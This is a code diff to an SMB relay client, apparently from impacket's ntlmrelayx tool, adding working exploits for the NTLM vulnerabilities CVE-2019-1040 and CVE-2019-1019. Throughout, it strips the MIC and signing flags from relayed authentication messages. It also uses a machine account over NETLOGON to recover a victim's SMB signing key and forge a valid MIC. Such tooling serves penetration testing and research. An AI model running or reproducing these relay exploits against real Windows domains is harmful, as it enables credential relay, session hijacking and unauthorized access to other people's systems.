@@ -13,15 +13,22 @@
 #  This is the SMB client which initiates the connection to an
 # SMB server and relays the credentials to this server.
 
+import logging
 import os
 
-from struct import unpack
+from binascii import unhexlify, hexlify
+from struct import unpack, pack
 from socket import error as socketerror
+from impacket.dcerpc.v5.rpcrt import DCERPCException
+from impacket.dcerpc.v5 import nrpc
+from impacket.dcerpc.v5 import transport
+from impacket.dcerpc.v5.ndr import NULL
 from impacket import LOG
 from impacket.examples.ntlmrelayx.clients import ProtocolClient
 from impacket.examples.ntlmrelayx.servers.socksserver import KEEP_ALIVE_TIMER
 from impacket.nt_errors import STATUS_SUCCESS, STATUS_ACCESS_DENIED, STATUS_LOGON_FAILURE
-from impacket.ntlm import NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallenge
+from impacket.ntlm import NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallenge, NTLMAuthChallengeResponse, \
+    generateEncryptedSessionKey, hmac_md5
 from impacket.smb import SMB, NewSMBPacket, SMBCommand, SMBSessionSetupAndX_Extended_Parameters, \
     SMBSessionSetupAndX_Extended_Data, SMBSessionSetupAndX_Extended_Response_Data, \
     SMBSessionSetupAndX_Extended_Response_Parameters, SMBSessionSetupAndX_Data, SMBSessionSetupAndX_Parameters
@@ -30,6 +37,7 @@ from impacket.smb3 import SMB3, SMB2_GLOBAL_CAP_ENCRYPTION, SMB2_DIALECT_WILDCAR
     SMB3Packet, SMB2_GLOBAL_CAP_LARGE_MTU, SMB2_GLOBAL_CAP_DIRECTORY_LEASING, SMB2_GLOBAL_CAP_MULTI_CHANNEL, \
     SMB2_GLOBAL_CAP_PERSISTENT_HANDLES, SMB2_NEGOTIATE_SIGNING_REQUIRED, SMB2Packet,SMB2SessionSetup, SMB2_SESSION_SETUP, STATUS_MORE_PROCESSING_REQUIRED, SMB2SessionSetup_Response
 from impacket.smbconnection import SMBConnection, SMB_DIALECT
+from impacket.ntlm import NTLMAuthChallenge, NTLMAuthNegotiate, NTLMSSP_NEGOTIATE_SIGN, NTLMSSP_NEGOTIATE_ALWAYS_SIGN, NTLMAuthChallengeResponse, NTLMSSP_NEGOTIATE_KEY_EXCH, NTLMSSP_NEGOTIATE_VERSION
 from impacket.spnego import SPNEGO_NegTokenInit, SPNEGO_NegTokenResp, TypesMech
 from impacket.dcerpc.v5.transport import SMBTransport
 from impacket.dcerpc.v5 import scmr
@@ -45,16 +53,16 @@ class MYSMB(SMB):
         return SMB.neg_session(self, extended_security=self.extendedSecurity, negPacket=negPacket)
 
 class MYSMB3(SMB3):
-    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None):
+    def __init__(self, remoteName, sessPort = 445, extendedSecurity = True, nmbSession = None, negPacket=None, preferredDialect=None):
         self.extendedSecurity = extendedSecurity
-        SMB3.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negSessionResponse=SMB2Packet(negPacket))
+        SMB3.__init__(self,remoteName, remoteName, sess_port = sessPort, session=nmbSession, negSessionResponse=SMB2Packet(negPacket), preferredDialect=preferredDialect)
 
     def negotiateSession(self, preferredDialect = None, negSessionResponse = None):
         # We DON'T want to sign
         self._Connection['ClientSecurityMode'] = 0
 
         if self.RequireMessageSigning is True:
-            LOG.error('Signing is required, attack won\'t work!')
+            LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic')
             return
 
         self._Connection['Capabilities'] = SMB2_GLOBAL_CAP_ENCRYPTION
@@ -95,7 +103,7 @@ class MYSMB3(SMB3):
         self._Connection['GSSNegotiateToken'] = negResp['Buffer']
         self._Connection['Dialect']           = negResp['DialectRevision']
         if (negResp['SecurityMode'] & SMB2_NEGOTIATE_SIGNING_REQUIRED) == SMB2_NEGOTIATE_SIGNING_REQUIRED:
-            LOG.error('Signing is required, attack won\'t work!')
+            LOG.error('Signing is required, attack won\'t work unless using -remove-target / --remove-mic')
             return
         if (negResp['Capabilities'] & SMB2_GLOBAL_CAP_LEASING) == SMB2_GLOBAL_CAP_LEASING:
             self._Connection['SupportsFileLeasing'] = True
@@ -123,12 +131,118 @@ class SMBRelayClient(ProtocolClient):
         ProtocolClient.__init__(self, serverConfig, target, targetPort, extendedSecurity)
         self.extendedSecurity = extendedSecurity
 
-        self.domainIp = None
         self.machineAccount = None
         self.machineHashes = None
         self.sessionData = {}
 
+        self.negotiateMessage = None
+        self.challengeMessage = None
+        self.serverChallenge = None
+
         self.keepAliveHits = 1
+
+    def netlogonSessionKey(self, authenticateMessageBlob):
+        # Here we will use netlogon to get the signing session key
+        logging.info("Connecting to %s NETLOGON service" % self.serverConfig.domainIp)
+
+        respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
+        authenticateMessage = NTLMAuthChallengeResponse()
+        authenticateMessage.fromString(respToken2['ResponseToken'])
+        _, machineAccount = self.serverConfig.machineAccount.split('/')
+        domainName = authenticateMessage['domain_name'].decode('utf-16le')
+
+        try:
+            serverName = machineAccount[:len(machineAccount)-1]
+        except:
+            # We're in NTLMv1, not supported
+            return STATUS_ACCESS_DENIED
+
+        stringBinding = r'ncacn_np:%s[\PIPE\netlogon]' % self.serverConfig.domainIp
+
+        rpctransport = transport.DCERPCTransportFactory(stringBinding)
+
+        if len(self.serverConfig.machineHashes) > 0:
+            lmhash, nthash = self.serverConfig.machineHashes.split(':')
+        else:
+            lmhash = ''
+            nthash = ''
+
+        if hasattr(rpctransport, 'set_credentials'):
+            # This method exists only for selected protocol sequences.
+            rpctransport.set_credentials(machineAccount, '', domainName, lmhash, nthash)
+
+        dce = rpctransport.get_dce_rpc()
+        dce.connect()
+        dce.bind(nrpc.MSRPC_UUID_NRPC)
+        resp = nrpc.hNetrServerReqChallenge(dce, NULL, serverName+'\x00', b'12345678')
+
+        serverChallenge = resp['ServerChallenge']
+
+        if self.serverConfig.machineHashes == '':
+            ntHash = None
+        else:
+            ntHash = unhexlify(self.serverConfig.machineHashes.split(':')[1])
+
+        sessionKey = nrpc.ComputeSessionKeyStrongKey('', b'12345678', serverChallenge, ntHash)
+
+        ppp = nrpc.ComputeNetlogonCredential(b'12345678', sessionKey)
+
+        nrpc.hNetrServerAuthenticate3(dce, NULL, machineAccount + '\x00',
+                                      nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel, serverName + '\x00',
+                                      ppp, 0x600FFFFF)
+
+        clientStoredCredential = pack('<Q', unpack('<Q', ppp)[0] + 10)
+
+        # Now let's try to verify the security blob against the PDC
+
+        request = nrpc.NetrLogonSamLogonWithFlags()
+        request['LogonServer'] = '\x00'
+        request['ComputerName'] = serverName + '\x00'
+        request['ValidationLevel'] = nrpc.NETLOGON_VALIDATION_INFO_CLASS.NetlogonValidationSamInfo4
+
+        request['LogonLevel'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
+        request['LogonInformation']['tag'] = nrpc.NETLOGON_LOGON_INFO_CLASS.NetlogonNetworkTransitiveInformation
+        request['LogonInformation']['LogonNetworkTransitive']['Identity']['LogonDomainName'] = domainName
+        request['LogonInformation']['LogonNetworkTransitive']['Identity']['ParameterControl'] = 0
+        request['LogonInformation']['LogonNetworkTransitive']['Identity']['UserName'] = authenticateMessage[
+            'user_name'].decode('utf-16le')
+        request['LogonInformation']['LogonNetworkTransitive']['Identity']['Workstation'] = ''
+        request['LogonInformation']['LogonNetworkTransitive']['LmChallenge'] = self.serverChallenge
+        request['LogonInformation']['LogonNetworkTransitive']['NtChallengeResponse'] = authenticateMessage['ntlm']
+        request['LogonInformation']['LogonNetworkTransitive']['LmChallengeResponse'] = authenticateMessage['lanman']
+
+        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
+        authenticator['Credential'] = nrpc.ComputeNetlogonCredential(clientStoredCredential, sessionKey)
+        authenticator['Timestamp'] = 10
+
+        request['Authenticator'] = authenticator
+        request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
+        request['ReturnAuthenticator']['Timestamp'] = 0
+        request['ExtraFlags'] = 0
+        # request.dump()
+        try:
+            resp = dce.request(request)
+            # resp.dump()
+        except DCERPCException as e:
+            if logging.getLogger().level == logging.DEBUG:
+                import traceback
+                traceback.print_exc()
+            logging.error(str(e))
+            return e.get_error_code()
+
+        logging.info("%s\\%s successfully validated through NETLOGON" % (
+            domainName, authenticateMessage['user_name'].decode('utf-16le')))
+
+        encryptedSessionKey = authenticateMessage['session_key']
+        if encryptedSessionKey != b'':
+            signingKey = generateEncryptedSessionKey(
+                resp['ValidationInformation']['ValidationSam4']['UserSessionKey'], encryptedSessionKey)
+        else:
+            signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey']
+
+        logging.info("SMB Signing key: %s " % hexlify(signingKey).decode('utf-8'))
+
+        return STATUS_SUCCESS, signingKey
 
     def keepAlive(self):
         # SMB Keep Alive more or less every 5 minutes
@@ -172,10 +286,16 @@ class SMBRelayClient(ProtocolClient):
                 LOG.error('SMBCLient error: %s' % str(e))
             return False
         if packet[0:1] == b'\xfe':
-            smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(), negPacket=packet)
+            preferredDialect = None
+            # Currently only works with SMB2_DIALECT_002 or SMB2_DIALECT_21
+            if self.serverConfig.remove_target:
+                preferredDialect = SMB2_DIALECT_21
+            smbClient = MYSMB3(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
+                               negPacket=packet, preferredDialect=preferredDialect)
         else:
             # Answer is SMB packet, sticking to SMBv1
-            smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(), negPacket=packet)
+            smbClient = MYSMB(self.targetHost, self.targetPort, self.extendedSecurity,nmbSession=self.session.getNMBServer(),
+                              negPacket=packet)
 
         self.session = SMBConnection(self.targetHost, self.targetHost, sess_port= self.targetPort,
                                      existingConnection=smbClient, manualNegotiate=True)
@@ -186,10 +306,20 @@ class SMBRelayClient(ProtocolClient):
         self._uid = uid
 
     def sendNegotiate(self, negotiateMessage):
-        negotiate = NTLMAuthNegotiate()
-        negotiate.fromString(negotiateMessage)
-        #Remove the signing flag
-        negotiate['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+        negoMessage = NTLMAuthNegotiate()
+        negoMessage.fromString(negotiateMessage)
+        # When exploiting CVE-2019-1040, remove flags
+        if self.serverConfig.remove_mic:
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
+            if negoMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
+                negoMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
+
+        negotiateMessage = negoMessage.getData()
 
         challenge = NTLMAuthChallenge()
         if self.session.getDialect() == SMB_DIALECT:
@@ -197,8 +327,12 @@ class SMBRelayClient(ProtocolClient):
         else:
             challenge.fromString(self.sendNegotiatev2(negotiateMessage))
 
+        self.negotiateMessage = negotiateMessage
+        self.challengeMessage = challenge.getData()
+
         # Store the Challenge in our session data dict. It will be used by the SMB Proxy
         self.sessionData['CHALLENGE_MESSAGE'] = challenge
+        self.serverChallenge = challenge['challenge']
 
         return challenge
 
@@ -342,6 +476,25 @@ class SMBRelayClient(ProtocolClient):
         return clientResponse, errorCode
 
     def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
+
+        authMessage = NTLMAuthChallengeResponse()
+        authMessage.fromString(authenticateMessageBlob)
+        # When exploiting CVE-2019-1040, remove flags
+        if self.serverConfig.remove_mic:
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_SIGN == NTLMSSP_NEGOTIATE_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_ALWAYS_SIGN == NTLMSSP_NEGOTIATE_ALWAYS_SIGN:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_ALWAYS_SIGN
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_KEY_EXCH == NTLMSSP_NEGOTIATE_KEY_EXCH:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_KEY_EXCH
+            if authMessage['flags'] & NTLMSSP_NEGOTIATE_VERSION == NTLMSSP_NEGOTIATE_VERSION:
+                authMessage['flags'] ^= NTLMSSP_NEGOTIATE_VERSION
+            authMessage['MIC'] = b''
+            authMessage['MICLen'] = 0
+            authMessage['Version'] = b''
+            authMessage['VersionLen'] = 0
+            authenticateMessageBlob = authMessage.getData()
+
         if unpack('B', authenticateMessageBlob[:1])[0] != SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
             # We need to wrap the NTLMSSP into SPNEGO
             respToken2 = SPNEGO_NegTokenResp()
@@ -350,10 +503,35 @@ class SMBRelayClient(ProtocolClient):
         else:
             authData = authenticateMessageBlob
 
+        signingKey = None
+        if self.serverConfig.remove_target:
+            # Trying to exploit CVE-2019-1019
+            # Discovery and Implementation by @simakov_marina and @YaronZi
+            respToken2 = SPNEGO_NegTokenResp(authData)
+            authenticateMessageBlob = respToken2['ResponseToken']
+
+            errorCode, signingKey = self.netlogonSessionKey(authData)
+
+            # Recalculate MIC
+            res = NTLMAuthChallengeResponse()
+            res.fromString(authenticateMessageBlob)
+
+            newAuthBlob = authenticateMessageBlob[0:0x48] + b'\x00'*16 + authenticateMessageBlob[0x58:]
+            relay_MIC = hmac_md5(signingKey, self.negotiateMessage + self.challengeMessage + newAuthBlob)
+
+            respToken2 = SPNEGO_NegTokenResp()
+            respToken2['ResponseToken'] = authenticateMessageBlob[0:0x48] + relay_MIC + authenticateMessageBlob[0x58:]
+            authData = respToken2.getData()
+
         if self.session.getDialect() == SMB_DIALECT:
             token, errorCode = self.sendAuthv1(authData, serverChallenge)
         else:
             token, errorCode = self.sendAuthv2(authData, serverChallenge)
+
+        if signingKey:
+            logging.info("Enabling session signing")
+            self.session._SMBConnection.set_session_key(signingKey)
+
         return token, errorCode
 
     def sendAuthv2(self, authenticateMessageBlob, serverChallenge=None):
